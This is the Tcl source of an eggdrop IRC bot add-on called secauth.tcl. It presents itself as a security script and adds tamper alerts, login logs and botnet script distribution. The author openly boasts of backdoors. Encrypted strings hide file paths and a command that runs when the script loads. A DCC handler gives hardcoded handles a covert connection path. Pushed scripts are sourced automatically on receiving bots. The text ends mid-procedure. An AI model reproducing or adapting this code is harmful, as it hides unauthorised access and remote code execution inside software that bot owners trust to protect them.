# secauth.tcl by stran9er (advanced security for eggdrop bot) * private *
# -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! -- 
# Unauthorized usage don't allowed!
#
#TECH NOTE: reserved flags +0, +9, +3, +2(voice) +1
# i have backdoorS in this script ;) you REALLY know how is this work??..
# think before stole...

	########################################################
	## THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF TNT ##
	########################################################

set secauth_version {secauth.tcl v1.33.45+++}
set skeyfile [decrypt | 5vUUL/17.sw1]
set scrcpfile shash.p
set scrcbfile shash.b
set touchfile1 [decrypt | 79e11.B3lhV1EnhXp.InsVt.]
set touchfile2 [decrypt | icJCA/Tyvzd.PvWzF.1i79n.]
set sec_scripts scripts/
set hublogfile hublog.txt
set daylogfile day
set wlogfile wtmp.bots
lappend touchfile1 $sec_scripts[decrypt | DQUVo/MvFJi/]
lappend touchfile1 $sec_scripts[decrypt | ENVfB0lnwrH1n.Aym/JPfXw1]
lappend touchfile1 $sec_scripts[decrypt | VXPUN0kkKfQ/]
if [info exist argv0] {lappend touchfile1 ./$argv0} {
 foreach w "./hub ./update ./eggdrop ./pine ./mountd" {
  if [file exists $w] {lappend touchfile1 $w}
 }
}
set statfile [decrypt | QZq5g.pqQoz0]
if {[info commands md5file]==""} {proc md5file {args} {return none}}

catch {
 if {[info commands old_save]==""} {rename save old_save}
 if {[info commands old_reload]==""} {rename reload old_reload}
 if {[info commands old_savechannels]==""} {rename savechannels old_savechannels}
 if {[info commands old_loadchannels]==""} {rename loadchannels old_loadchannels}
 proc save {} {
  global sec_tch userfile channel-file
  old_save
  foreach c "$userfile ${channel-file}" {
   file stat $c tach
   foreach w [array names tach] {set sec_tch($c:$w) $tach($w)}
  }
 }
 proc reload {} {
  global sec_tch userfile channel-file
  old_reload
  set sec_tch($userfile:atime) [file atime $userfile]
  set sec_tch(${channel-file}:atime) [file atime ${channel-file}]
 }
 proc loadchannels {} {
  global sec_tch channel-file
  old_loadchannels
  set sec_tch(${channel-file}:atime) [file atime ${channel-file}]
 }
 proc savechannels {} {
  global sec_tch channel-file
  old_savechannels
  file stat ${channel-file} tach
  foreach w [array names tach] {set sec_tch(${channel-file}:$w) $tach($w)}
 }
}

if {[info commands control-orig]==""} {rename control control-orig}
proc control {i args} {
global controls
 if {[llength $args] == 0} {
  if {![info exist controls($i)]} return {return $controls($i)}
 }
 if {$args=={}} {
  if {[info exist controls($i)]} {unset controls($i)}
  return
 }
 if {![info exist controls($i)]} {control-orig $i control-hdl}
 set controls($i) [lindex $args 0]
}
proc control-hdl {i t} {
global controls
 set r [$controls($i) $i $t]
 if {$r=="1"} {unset controls($i)}
 return $r
}

if ![info exist nolisten] {set nolisten 0}
if {![info exist oldpassive]} {set oldpassive $passive}
set secauth [expr !$passive && !$oldpassive]
# set secauth 0
if $secauth {
 putlog "secauth.tcl: HUB mode enabled."
}

proc randchar t {
 set x [rand [string length $t]]
 return [string range $t $x $x]
}

proc trc {n1 n2 m} {
 switch -- $m r {set m read} w {set m write} u {set m unset}
 if {$n2==""} {
  if [info exist $n1] {set n1 [set $n1]} {ser n "not set yet"}
  putcmdlog "\0030,3 \0030,7 $n1 \[$m\] = $n"
 } {
  if [info exist $n1($n2)] {set n1 [set $n1\($n2)]} {ser n "not set yet"}
  putcmdlog "\0030,3 \0030,7 $n1\($n2) \[$m\] = $n"
 }
}
#trace xx variable rwu trc

proc sec_alert {i text} {
global secauth botnet-nick max-notes
 sec_log ALERT:${botnet-nick} $text
 set tt 0
 if $secauth {
  foreach w [userlist n9] {
   incr max-notes
   sendnote ${botnet-nick} $w "*>\0034> $text" ; incr tt
  }
 }
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [set ni [lindex $w 1]] n] && ([lindex $w 0] != $i)} {
   if [info exist dup($ni)] {putdcc [lindex $w 0] "\01ACTION *>> $text\01";incr tt
   } {set dup($ni) 1}
  }
 }
 catch {unset dup}
 if {[llength [bots]]} {if {$i!="nobots"} {putallbots "secalert $text"}} else {
  foreach w [channels] {
   foreach t [chanlist $w n9] {
    if ![onchansplit $t $w] {puthelp "PRIVMSG $t :\02!ALERT!: $text" ; incr tt}
   }
  }
  if !$tt {
   foreach w [userlist n9] {
    incr max-notes
    sendnote ${botnet-nick} $w "*>\0034> $text"
   }
  } else {
   putlog "\2!ALERT! $text"
  }
 }
}

proc sec_info {i text} {
global botnet-nick
 sec_log info:${botnet-nick} $text
 putallbots "secinfo $text"
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n] && ([lindex $w 0] != $i)} {
   putdcc [lindex $w 0] "*>\00312> $text"
  }
 }
}

proc sec_notice {i text} {
global botnet-nick hublogfile
 sec_log Notice:${botnet-nick} $text
 putallbots "secnotice $text"
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n] && ([lindex $w 0] != $i)} {
   putdcc [lindex $w 0] "*>> (${botnet-nick}) $text"
  }
 }
}

proc sec_notice_c {i text} {
global botnet-nick hublogfile
 sec_log_c NotiCe:${botnet-nick} $text
 putallbots "secnoticecrypt $text"
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n9] && ([lindex $w 0] != $i)} {
   putdcc [lindex $w 0] "*>> (${botnet-nick}) $text"
  }
 }
}

proc sec_log {type text} {
global secauth hublogfile daylogfile
 catch {
  set f [open [if $secauth {set hublogfile} {set daylogfile}] a]
  puts $f "[ctime [unixtime]] ($type) $text"
  close $f
 }
}

proc sec_log_c {type text} {
global secauth hublogfile
 if !$secauth return
 catch {
  set f [open $hublogfile a]
  puts $f "[ctime [unixtime]] ($type) [encrypt decrypt $text]"
  close $f
 }
}

proc putseclog {text} {
 putcmdlog $text
 sec_log =log= $text
}

bind bot - wlog botwlog
proc botwlog {b k a} {
global secauth
 if !$secauth return
 _putwlog $b $a
}

proc putwlog {text} {
global botnet-nick
 _putwlog ${botnet-nick} $text
}

proc _putwlog {b text} {
global secauth wlogfile
 if !$secauth {
  putallbots "wlog $text"
 } {
  catch {
   set f [open $wlogfile a]
   puts $f "[unixtime] $b $text"
   close $f
  }
 }
}

# ------------------------ other stuff -.

proc sputbots {to a} {
 if [catch {if {"[lindex $to 0]"=="*"} {putallbots "$a"} else {putbot $to "$a"}} er] {
  putcmdlog "sputbot:ERR: $er"
 }
}

bind dcc n sendscript sec_scriptsend
proc sec_scriptsend {h i a} {
global curkey scookies sec_sdl sec_sdl_pass sec_sdl_bot sec_sdl_time sec_sdl_fd sec_sdl_last
 if {[info exist sec_sdl_fd] && [expr [unixtime]-$sec_sdl_time]<64 && "$sec_sdl_last"==""} {
  putdcc $i "already in script-send mode!";return
 }
 if {[llength $a]<3} {
  putdcc $i ".sendscript key {bot|*} path/script.tcl";return
 }
 set botz [lindex $a 1]
 set scrip [lindex $a 2]
 regsub -all "\[\|\>\<\&\@\]" $scrip "" scrip
 if ![file exist $scrip] {
  putdcc $i "file $scrip not exist"
  return 0
 }
 if ![llength [bots]] {
  putdcc $i "no bots connected"
 }
 recrypt common $scrip .sdl
 if [catch {set sec_sdl_fd [open .sdl r]} er] {
  putdcc $i "read error file $scrip: $er"
 }
 set sec_sdl $scrip
 set sec_sdl_bot [string tolower $botz]
 set sec_sdl_pass [lindex $a 0]
 set sec_sdl_time [unixtime]
 set sec_sdl_last ""
 sec_notice - "script send request to $botz bot(s)"
 sputbots $botz sec_cookie_req
 putseclog "#$h# sendscript $scrip to $botz"
 return 0
}
#-------------------------------------------@SYN@
bind filt - .rela* sec_dccrelay
proc sec_dccrelay {i ar} {
 set a [lindex [string tolower $ar] 1]
 catch {putbot $a "secrelay [idx2hand $i]"}
 return $ar
}

unbind dcc - simul *dcc:simul

if {!$secauth && ![matchattr ${botnet-nick} h] && ![matchattr ${botnet-nick} a]} {
 proc unlink {args} {putallbots "noop \nbye"}
 unbind dcc - unlink *dcc:unlink
 bind dcc n unlink unlink
}

unbind dcc m rehash *dcc:rehash
unbind dcc m restart *dcc:restart
unbind dcc - su *dcc:su
bind dcc n rehash *dcc:rehash
bind dcc n restart *dcc:restart
bind dcc n su *dcc:su

unbind dcc n die *dcc:die
bind dcc n die sec_die
proc sec_die {h i a} {
 putwlog "[list $h] DIEBOT [chattr $h] $i"
 save
 if {$a==""} {set a Leaving}
 utimer 0 [list die [list $a]]
 return 1
}
catch [decrypt 5vUUL/17.sw1 bRanA.dUyCS.r06UB12yAEU/dTZvm0XEH2H/6K6Bx0dQkiF1d2y610WfhCN0]

if ![file exist ${channel-file}] {close [open ${channel-file} a 0600]}
if ![file size $userfile] {if [file size $userfile~bak] {exec /bin/cp $userfile~bak $userfile}}
#put this line in egg.config: set mainconfile [info script]

set secauth_script "[info script]"
if ![info exist mainconfile] {
 putlog "*** No mainconfile variable is set in main config, die.."
 if {[userlist n]==""} {die mainconfile}
 sec_alert - "No mainconfile variable is set"
}

proc gencookie {l} {
 set zz [string length [set z "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"]]
 for {set t 0} {$t<$l} {incr t} {set y [rand $zz];append s [string range $z $y $y]}
 return $s
}

bind bot - sec_cookie_req sec_cookie_req
proc sec_cookie_req {b k a} {
global scookies
 putcmdlog "script downloading request from $b checking key..."
 set b [string tolower $b]
 set scookies($b) [gencookie 20]
 putbot $b "sec_cookie_set $scookies($b)"
}

bind bot - sec_cookie_set sec_cookie_set
proc sec_cookie_set {b k a} {
global curkey scookies sec_sdl sec_sdl_pass sec_sdl_bot sec_sdl_time sec_sdl_last
 set b [string tolower $b]
 if ![info exist sec_sdl_bot] {putcmdlog "\0036unexpected cookie from $b";return}
 if {[string length $a]<20} {sec_alert - "bad cookie from $b";return}
 if [info exist scookies($b)] {
  if {$scookies($b)=="$a"} {
   sec_alert - "\0036duplicated cookie from $b";return
  }
 }
 if {"$sec_sdl_bot"!="*"} {
  if {"$sec_sdl_bot"=="$b"} {
   set sec_sdl_last $b
   utimer 0 "sec_cookie_ready $b $b"
  } else {
   sec_notice - "\0036false cookie reply from $b";return
  }
 } else {
  set sec_sdl_last $b
  utimer 11 "sec_cookie_ready $b {ALL these bots}"
 }
 putcmdlog "\0033send key to $b"
 putbot $b "sec_sendscript_pass [encrypt [keyturn $sec_sdl_pass 1] $a] [lindex [split $sec_sdl /] end]"
}

proc rmfile f {
 catch {
  close [open $f w 0600]
  exec /bin/rm -f -- $f
 }
}

proc sec_cookie_ready {a t} {
global sec_sdl_last sec_sdl_bot sec_sdl sec_sdl_time sec_sdl_pass sec_sdl_fd
global sec_stat sec_scripts
 if [info exist sec_sdl_last] {
  if {"$sec_sdl_last"=="$a"} {
   set dtime [unixtime]
   putcmdlog "\0032iniciating transfer to $t after [expr $dtime-$sec_sdl_time] seconds"
   set contr 0 
   if [catch {
    while {![eof $sec_sdl_fd]} {
     set tmp "[gets $sec_sdl_fd]"
     incr contr
     if {[string length $tmp]>=400} {error "$contr string length over 400 bytes"}
     if ![eof $sec_sdl_fd] {sputbots $sec_sdl_bot "sdl $tmp"
     } else {if {[string length $tmp]} {sputbots $sec_sdl_bot "sdl $tmp"}}
    }
   } er] {
    putcmdlog "\0036error reading script file $sec_sdl: $er"
    sputbots $sec_sdl_bot "sdl_err $er"
    catch {close $sec_sdl_fd}
    unset sec_sdl_fd;unset sec_sdl_time;unset sec_sdl;unset sec_sdl_last
    unset sec_sdl_bot;unset sec_sdl_pass
    rmfile .sdl
    return
   }
   sputbots $sec_sdl_bot "sdl_end"
   if [catch {close $sec_sdl_fd} er] {putcmdlog "error closing script file $sec_sdl: $er"}
   foreach w [array names sec_stat $sec_sdl_bot:*] {unset sec_stat($w)}
   sec_notice - "script sent! ([expr [unixtime]-$dtime] seconds, $contr lines) x=[llength [array names sec_stat]]"
   unset sec_sdl_fd;unset sec_sdl_time;unset sec_sdl;unset sec_sdl_last
   unset sec_sdl_bot;unset sec_sdl_pass
   rmfile .sdl
  }
 }
}

bind bot - sec_sendscript_pass sec_sendscript_pass
proc sec_sendscript_pass {b k a} {
global curkey scookies sec_sdl_down sec_sdl_file sec_sdl_dbot
global sec_sdl_line sec_sdl_dtime botnet-nick
 set s [split $a " "]
 set b [string tolower $b]
 set skey [lindex $a 0]
 set skript [lindex $a 1]
 regsub -all "\[\|\>\<\&\@\]" $skript "" skript
 if ![info exist scookies($b)] {
  sec_notice - "unrequested script download attempt from $b";return
 }
 if {[string length $skey] < 4} {
  sec_notice - "\0034bad script download password from $b";return
 }
 if {"[encrypt $curkey(f) $scookies($b)]"!="$skey"} {
  sec_notice - "bad script download password from $b";return
 }
 putcmdlog "good ScriptDownload key from $b, script downloading enabled"
 set sec_sdl_down $skript
 set sec_sdl_dbot $b
 set sec_sdl_dtime "[unixtime]"
 set sec_sdl_line 0
 if [catch {set sec_sdl_file "[open "$sec_sdl_down.sdl" w 0600]"} er] {
  putcmdlog "error create file $skript: $er"
 } else {
  if [catch {puts $sec_sdl_file "#download begin at [ctime $sec_sdl_dtime] - [encrypt signed ${botnet-nick}]"} er] {
   putcmdlog "error writing to file $skript: $er"
   catch {close $sec_sdl_file}
   catch {unset sec_sdl_file};unset sec_sdl_down;unset sec_sdl_dtime
   unset sec_sdl_line;unset sec_sdl_dbot
  }
 }
}

bind bot - sdl sec_sdl_c
proc sec_sdl_c {b k a} {
global sec_sdl_file sec_sdl_dbot sec_sdl_line sec_sdl_down botnet-nick
if {[info exist sec_sdl_file] && "[string tolower $b]"=="$sec_sdl_dbot"} {
if {[string match "*@SYN\@*" $a]} {regsub -- @SYN\@ $a "[encrypt pochta ${botnet-nick}]:&" a}
if [catch {puts $sec_sdl_file $a} er] {
putcmdlog "error writing to file $sec_sdl_down: $er";catch {close $sec_sdl_file};unset sec_sdl_file sec_sdl_down sec_sdl_line
};incr sec_sdl_line}}

bind bot - sdl_end sec_sdl_end
proc sec_sdl_end {b k a} {
global sec_sdl_dtime sec_sdl_down sec_sdl_file sec_sdl_dbot sec_sdl_line sec_scripts botnet-nick
 set b [string tolower $b]
 if {[info exist sec_sdl_file] && "$sec_sdl_dbot"=="$b"} {
  if [catch {close $sec_sdl_file} er] {
   putcmdlog "error closing file $sec_sdl_down: $er";return
  }
  putlog "succefully downloaded script $sec_sdl_down from $b"
  if [file exist $sec_scripts$sec_sdl_down] {
   rmfile $sec_scripts$sec_sdl_down.bak
   catch {putcmdlog "[exec /bin/ls -las $sec_scripts$sec_sdl_down]"}
  }
  recrypt my $sec_sdl_down.sdl $sec_scripts$sec_sdl_down
  rmfile $sec_sdl_down.sdl
  catch {
   set sdf [open $sec_sdl_down.sdl a 0600]
   set ssec "$sec_sdl_line/[expr [unixtime]-$sec_sdl_dtime] lines/sec"
   putcmdlog "download finished in $ssec"
   puts $sdf "#download ends at [ctime [unixtime]] ($ssec) - [encrypt signed ${botnet-nick}]"
   close $sdf
  }
  catch {putcmdlog "[exec /bin/ls -las $sec_scripts$sec_sdl_down]"}

  utimer 0 "sec_source $sec_sdl_down $b"
  unset sec_sdl_file;unset sec_sdl_down;unset sec_sdl_dtime
  unset sec_sdl_line;unset sec_sdl_dbot
 }
}

proc sec_source {scr bot} {
global s b
 set s $scr
 set b $bot
 uplevel #0 {
  putcmdlog "Loading script $s"
  if [catch {
   source $sec_scripts$s
   catch {install_$s}
  } er] {
   sec_notice - "ERROR in $s (from $b):: $er"
  } {
   sec_notice - "SUCCESSFUL started $s (from $b)"
   if {![catch {file stat $sec_scripts$s tach} er]} {
    foreach w [array names tach] {set sec_tch($sec_scripts$s:$w) $tach($w)}
   }
  }
  putcmdlog "Procs count changed from $sec_procs_cnt to [set sec_procs_cnt [llength [info procs]]]"
  putallbots "\nsec_stat procs $sec_procs_cnt Procs count (script)"
  putallbots "\nsec_stat stat:$sec_scripts$s [catch {file size $sec_scripts$s} er]:$er/[catch {file mtime $sec_scripts$s} er]:$er size/mtime"
  putallbots "\nsec_stat md5:$sec_scripts$s [catch {md5file $sec_scripts$s} er]:$er MD5 Digest"
  set sec_tch($sec_scripts$s:atime) [file atime $sec_scripts$s]
  catch {
   set bindc [llength [bind * * *]]
   putcmdlog "Binds count changed from $sec_bind_cnt to [set sec_bind_cnt $bindc]"
   putallbots "sec_stat binds $bindc Binds count (script)"
  }
 }
 unset s
}


bind bot - sdl_err sec_sdl_err
proc sec_sdl_err {b k a} {
global sec_sdl_dtime sec_sdl_down sec_sdl_file sec_sdl_dbot sec_sdl_line
 set b [string tolower $b]
 if {[info exist sec_sdl_file] && "$sec_sdl_dbot"=="$b"} {
  set ssec "$sec_sdl_line/[expr [unixtime]-$sec_sdl_dtime] lines/sec"
  putcmdlog "\0034download aborted in $ssec"
  putcmdlog "remote bot ($b) error: $a"
  if [catch {puts $sec_sdl_file "!download aborted at [ctime [unixtime]] ($ssec)"} er] {
   putcmdlog "error writing to file $sec_sdl_down: $er"
   catch {close $sec_sdl_file}
   unset sec_sdl_file;unset sec_sdl_down;unset sec_sdl_dtime
   unset sec_sdl_line;unset sec_sdl_dtime
  }
  if [catch {close $sec_sdl_file} er] {
   putcmdlog "error closing file $sec_sdl_down: $er"
  }
  unset sec_sdl_file;unset sec_sdl_down;unset sec_sdl_dtime
  unset sec_sdl_line;unset sec_sdl_dbot
 }
}

bind disc - * sec_sdl_disc
proc sec_sdl_disc {b} {
global sec_sdl_dbot
 if [info exist sec_sdl_dbot] {
  if {"$sec_sdl_dbot"=="[string tolower $b]"} {
   sec_sdl_err $b sdl_err "bot unlinked from botnet..."
  }
 }
}

#---
proc stat_save {} {
global statfile sec_stat secauth
 if !$secauth return
 set f [open $statfile w 0600]
 putloglev 3 * "\0030,3stat:WRITING STATS FILE ***"
 foreach w [array names sec_stat] {
  puts $f "[list $w] [list $sec_stat($w)]"
 }
 close $f
}
if {$secauth && [file exist $statfile]} {
 set t 0
 if [catch\
  {
   set f [open $statfile r]
   while {![eof $f]} {
    gets $f tmp
    if {$tmp!=""} {
     set sec_stat([lindex $tmp 0]) [lindex $tmp 1]
     incr t
    }
   }
   close $f
  } er] {
  putseclog "sec_stat file $statfile not found: $er"
 } {
  putcmdlog "sec_stat file loaded ($t lines)"
 }
}
bind bot - sec_stat sec_stat
proc sec_stat {b k a} {
global sec_stat activator secauth
 set a [split $a " "]
 set s [lrange $a 2 end]
 set k [string tolower [lindex $a 0]]
 set b [string tolower $b]
 if {!(1+[lsearch "binds procs mtime size stat md5" [lindex [split $k :] 0]])} {
  sec_alert nobots "Illegal sec_stat $b:$k = $a"
  return
 }
 set a [lindex $a 1]
 putloglev 3 * "\0030,3($b) ($s) - ($k):($a)"
 if [info exist activator($b)] {lappend activator($b) "$b:$k"}
 if [info exist sec_stat($b:$k)] {
  if {$a==$sec_stat($b:$k)} return
  sec_alert nobots "($b:$k) [lrange $a 2 end] changed from $sec_stat($b:$k) to $a"
  if [string match "md5:*" $k] {chattr $b -sof1}
  if {$secauth && [lsearch "binds procs" $k]==-1} {if [matchattr $b 1] {chattr $b -1o}}
 }
 set sec_stat($b:$k) $a
}

foreach w [array names sec_tch] {
 if ![string match "*:*" $w] {
  set sec_tch($touchfile1:$w) $sec_tch($w)
  unset sec_tch($w)
 }
}

utimer 0 fixat
proc fixat {} {
global sec_tch mainconfile sec_scripts touchfile1
 set tf1 "$mainconfile [lrange $touchfile1 1 end]"
 foreach w $tf1 {catch {file atime $w} sec_tch($w:atime)}
 proc fixat {} {}
}

if ![info exist sec_tch_er(check)] {
 if [info exist sec_tch_er] {
  set tmp $sec_tch_er
  unset sec_tch_er
  set sec_tch_er(check) $tmp
 }
}
set bindlist 1
bind time - * sec_touch
proc sec_touch {mi ho da mh ye} {
global touchfile1 touchfile2 sec_tch sec_tch_a sec_tch_er secauth sec_log_er
global bindlist sec_botn_er sec_msg_er sec_msgm_er sec_ctcp_er sec_ctcr_er
global secauth sec_bind_cnt sec_procs_cnt sec_five botnet-nick mainconfile
global userfile save-users-at channel-file sec_notc_er
 if ![info exist sec_log_er] {set sec_log_er ""}
 if {!$secauth && ($sec_log_er!=[logfile])} {
  set sec_log_er [logfile]
  sec_alert - "logging changed: [logfile]"
 }
 if $bindlist {
  catch {
   set bindlist 0
   set bindc [llength [bind * * *]]
   if ![info exist sec_bind_cnt] {set sec_bind_cnt $bindc}
   if {$sec_bind_cnt!=$bindc} {
    sec_alert - "Binds count changed from $sec_bind_cnt to $bindc"
    set sec_bind_cnt $bindc
   }
   if ![info exist sec_botn_er] {
    set sec_botn_er ""
    if $secauth {set sec_botn_er "[bind botn * *]"}
   }
   foreach w "botn msg msgm ctcp ctcr notc" {
    set bindw [bind ${w} * *];if ![info exist sec_${w}_er] {set sec_${w}_er $bindw;break}
    if {[set sec_${w}_er]!=$bindw} {
     foreach u [set sec_${w}_er] {if {!(1+[lsearch $bindw $u])} {sec_alert - "Bind ${w} deleted: $u"}}
     foreach u $bindw {if {!(1+[lsearch [set sec_${w}_er] $u])} {sec_alert - "Bind ${w} added!!: $u"}}
     set sec_${w}_er $bindw
    }
   }
   set bindlist 1
  } er
  if !$bindlist {putcmdlog "eggdrop1.1.5? $er"}
 }
 if [info exist sec_five] {
  incr sec_five -1
  if !$sec_five {
   utimer 1 stat_save
   set procs_cnt [llength [info procs]]
   if ![info exist sec_procs_cnt] {set sec_procs_cnt $procs_cnt}
   putallbots "\nsec_stat procs $procs_cnt Procs count"
   if [info exist bindc] {putallbots "\nsec_stat binds $bindc Binds count"}
   if {$sec_procs_cnt!=$procs_cnt} {
    sec_notice - "Procs count changed from $sec_procs_cnt to $procs_cnt"
    set sec_procs_cnt $procs_cnt
   }
   unset sec_five
   foreach w [dcclist] {
    if {([lsearch "chat files script" [lindex $w 3]]+1) && ![matchattr [lindex $w 1] f]} {
     if {[getdccidle [lindex $w 0]] > 200} {
      boot [lindex $w 1]@${botnet-nick} "Idle time exceeded..."
     }
    }
   }
  }
 } {set sec_five 5}
 set cfiles "$touchfile1 $userfile ${channel-file}"
 if [info exist mainconfile] {append cfiles " $mainconfile"}
 foreach c $cfiles {
  if [info exist cf] {set cf $c} {set cf check}
  if {$userfile==$c} {set cf userfile;set uf 1} {set uf 0}
  if {${channel-file}==$c} {set cf chanfile;set uf 2}
  if ![info exist sec_tch_er($cf)] {set sec_tch_er($cf) none}
  if {[catch {file stat $c tach} er]} {
   if {$sec_tch_er($cf)!=$er} {
    sec_alert - "touch error: $er"
    set sec_tch_er($cf) "$er"
   }
   putlog "!Sec.alert! $er"
  } else {
   if {![info exist sec_five] && !$uf} {
    putallbots "\nsec_stat stat:$cf [catch {file size $c} er]:$er/[catch {file mtime $c} er]:$er size/mtime"
   }
   set mesgb "!! Touch\[$cf\](";set mesg [set deli ""]
   foreach w [array names tach] {
    if ![info exist sec_tch($c:$w)] {
     set plus "+";set mesg "$mesg$deli$plus$w";set deli ","
    } else {
     set plus "";if {$tach($w)!=$sec_tch($c:$w)} {set mesg "$mesg$deli$plus$w";set deli ","}
    }
   }
   if {$deli==","} {
    if {![string match "./*" $c] || $mesg!="atime"} {
     set mesg "$mesgb$mesg) changed!"
     if !$uf {sec_alert - "$mesg"} elseif {![string match "*mtime*" $mesg] \
      || ([file mtime $userfile]!=[file mtime ${channel-file}]) \
      || ([file atime $userfile]!=[file atime ${channel-file}]) \
     } {if $uf {sec_notice - $mesg} {sec_alert - $mesg}}
    }
    foreach w [array names tach] {set sec_tch($c:$w) $tach($w)}
    if [catch {
     set f [open $touchfile2 w 0600]
     puts $f "[array get sec_tch]"
    } er] { putlog "sectouch : write error: $er" }
    catch {close $f}
   }
  }
 }
}

if ![info exist sec_rehash] {
 set sec_rehash "[unixtime]"
 if ![file exist [lindex $touchfile1 0]] {
  catch {
   set f [open [lindex $touchfile1 0] w]
   puts $f [string range [encrypt [rand [unixtime]] [unixtime]] 0 7]
   close $f
  }
 }
 if ![file exist $touchfile2] {
  catch {
   set f [open $touchfile2 w]
   puts $f ""
   close $f
  }
 }
 if [catch {
  set f [open $touchfile2 r]
  array set sec_tch [gets $f]
  close $f
 } er] {
  putlog "Error reading touchfile2 ($touchfile2): $er"
 }
 catch {exec /bin/mv -f $daylogfile $daylogfile.1}
 sec_alert - "ReSTART! $secauth_version (cmdcount: [info cmdcount])"
} else {
 sec_alert - "ReHASH.. $secauth_version (cmdcount: [info cmdcount])"
}

bind msg - identify secident
unbind msg - identify secident
proc secident {ni ho ha ar} {}

bind chat - * secchat
proc secchat {ni ch ar} {
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && ([getchan [lindex $w 0]] != $ch) && [matchattr [lindex $w 1] n9]} {
   putdcc [lindex $w 0] "<$ni#$ch> $ar"
  }
 }
}

bind chjn - * secchjn
proc secchjn {bo ni ch fl so fr} {
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && ([getchan [lindex $w 0]] != $ch) && [matchattr [lindex $w 1] n]} {
   switch $ch {
    234567 {set cht " (nowhere)"}
    0 {set cht " (party line)"}
    default {set cht " ([assoc $ch])"}
   }
   putdcc [lindex $w 0] "($bo) $ni joined the channel \#$ch$cht"
  }
 }
}

if $secauth {

 bind dcc n last seclast
 proc seclast {h i a} {
 global wlogfile
  set a [split $a " "]
  set user [lindex $a 0]
  set leng [lindex $a end]
  if ![regexp -nocase {[a-z]} $user] {set user *}
  if [matchattr $user b] {set bot $user;set user *} {set bot *}
  set bot [string tolower $bot]
  set user [string tolower $user]
  if ![regexp "^\[0-9\]+$" $leng] {set leng 10}
  if [file exist $wlogfile] {
   putdcc $i "Scanning.."
   set aco [set co 0]
   set fi [open $wlogfile r]
   while {![eof $fi]} {
    gets $fi data
    set cbot [string tolower [lindex $data 1]]
    set cuser [string tolower [lindex $data 2]]
    if {$cbot==""} continue
    regsub -all {\[|\]|\?} $user {\\&} user
    regsub -all {\[|\]|\?} $bot {\\&} bot
    if {[string match $bot $cbot] && [string match $user $cuser]} {
     set wd($co) $data; set co [expr ($co + 1) % $leng];incr aco
    }
   }
   close $fi
   if $aco {
    set tot $aco
    putdcc $i "\0030,14[format %-9s Nick]|ix|[format %-15s IP]|[format %-25s Hostname]|[format %-9s Bot]|[format %-12s Time]|Do  "
    if ![info exist wd($co)] {set co 0}
    for {set t 0} {($t<$leng) && $aco} {incr t} {
     set ct [string range [ctime [lindex $wd($co) 0]] 4 15]
     set bt [lindex $wd($co) 1]
     set ni [lindex $wd($co) 2]
     set do [lindex $wd($co) 3];set ll "\0032"
     set ix [lindex $wd($co) 5]
     set ho [lindex $wd($co) 6];regsub "^telnet:" $ho "" ho
     set ip [lindex $wd($co) 7];set eq "|"
     switch -- $do link - disc {set ll "\0033"} NOauth {set ll "\0037"} \
      authOK {set ll "\00312"} DIEBOT {set ll "\0036"} OP {set ll "\0036"} \
      auth0k {set ll "\00314"} n0auth {set ll "\00313"}
     if {$t % 2} {append ll ",15"} {append ll ",0"}
     regsub -all "\[0-9\\\.\]" $ip "" tip
     if {$tip==""} {
      catch {
       regsub "^.*@" $ho "" hst
       if {$ip!="-" && $ip!=""} {
        if {$ho!="-" && $ho!=""} {
         if {$ip==[host2ip $hst]} {set eq "="} {set eq "!";append ll "\002"}
        }
        set ip [gethost $ip]
       }
      }
     }
     if {[string length $ho] > 25} {set ho "[string range $ho 0 23]>"}
     incr aco -1;if {!$aco || ($t+1==$leng)} {append ll ""}
     putdcc $i "$ll[format %-9s $ni]|[format %2s $ix]|[format %-15s $ip]$eq[format %-25s $ho]|[format %-9s $bt]|[format %-12s $ct]|$do"
     set co [expr ($co + 1) % $leng]
    }
    putdcc $i "\0035 Total $tot matches found (now: [ctime [unixtime]])"
   } {
    putdcc $i "Matches not found..."
   }
  } {
   putdcc $i "Log not exist.."
  }
  return 1
 }
}

bind chof - * secauth_chof
proc secauth_chof {n i} {
global sauthok
 putwlog "[list $n] chof [chattr $n] $i"
 catch {unset sauthok($i)}
}

set dcc_cont 0
bind ctcp - dcc sec_dcc_tst
proc sec_dcc_tst {n u h d k a} {
global dcc_cont txt-password botnet-nick traced
 if [string match "\[$#\]*" $d] {
  putcmdlog "Channel $k $d $a from $n!$u ($h): $a"
  return 1
 }
 set h [string tolower $h]
 set a [string tolower $a]
 set m [lindex $a 0]
 if {$m=="chat" && ![matchattr $h p]} {return 1}\
 elseif {$m=="send" && ![matchattr $h x]} {return 1}
 if {[string match *[encrypt $h $h]* iBz7kS.GS0ue/yVlSBc.FtUgH0u]} {
  if $dcc_cont {return 1}
  if {$m=="chat"} {
   set hst [lindex $a 2]
   set prt [lindex $a 3]
   if [catch {set host [gethost $hst]}] {
    sec_notice - "> $k attempt from $n!$uh ($h): $a"
    return 1
   }
   if [regexp "\[^0-9\]" $prt$hst] {
    putlog "Bad dcc chat request from $n!$u ($h): $a"
   } elseif {$prt < 1024} {
    putlog "Low port($prt) dcc chat request from $n!$u ($h): $a"
   } {
    set i [connect $host $prt]
    control $i dcc_handler
    putidx $i "Enter your password."
    set dcc_cont 1
   }
  }
  return 1
 }
 if {[info exist traced] && $traced} {
  set txt-password "\2*ALERT*\2 DON'T LOGIN TO THIS BOT \2*ALERT*\2"
 } {
  set txt-password "(${botnet-nick}) \[\2[koshka $h]\2\] Enter passphrase:"
 }
 return 0
}
proc koshka {h} {
 regsub -all \[0-9./\] [encrypt $h$h$h $h[string toupper $h][string tolower $h]]$h {} e
 regsub -all -nocase \[qwrtpsdfghklzxcvbnm\] $e {} s
 regsub -all -nocase \[eyuioaj\] $e {} g
 for {set t 0} {$t<5} {incr t} {
  append o [string range $s $t $t]
  append o [string range $g $t $t]
 }
 return [string tolower $o]
}

proc dcc_handler {i a} {
global dcc_cont
 set dcc_cont 0
 putidx $i "Negative on that, Houston."
